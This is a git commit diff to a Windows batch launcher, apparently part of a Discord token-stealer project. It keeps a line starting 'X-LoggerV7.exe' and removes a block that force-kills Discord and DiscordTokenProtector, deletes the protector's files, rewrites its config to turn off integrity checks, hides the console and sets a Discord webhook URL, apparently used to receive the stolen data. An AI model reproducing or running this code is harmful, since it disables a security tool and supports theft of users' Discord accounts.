0b61916510c2e1b36ebd800620da3f6098a499db
Ochy <147992336+ochysponomi@users.noreply.github.com>
2023-11-03 19:38:01 +0100

    setup.bat

--- Luncher.bat
+++ Luncher.bat
@@ -1,29 +1,6 @@
+@echo
 start X-LoggerV7.exe 
-::coded by elspiritdav4sbe
-
-::DiscordTokenProtector pussy destroyer
-taskkill /im Discord.exe /f
-taskkill /im DiscordTokenProtector.exe /f
-del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
-del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
-del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
-echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-echo anti DiscordTokenProtector by github.com/ochysponomi >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
-@echo off
-SETCONSOLE /Hide
-CONSOLESTATE /hide
-set webhook=https://discord.com/api/webhooks/1164229785845772289/74hC6mt0Qs_A85MV8zByyTv4W5Yh8CxWlelUuwNK4JxFzBODtHuTrYJH1vzlxwPw5v5s
+echo L'instalation des package ! Ochy is beautiful
+pip install datachecks
+pip install Flask
+start start.bat
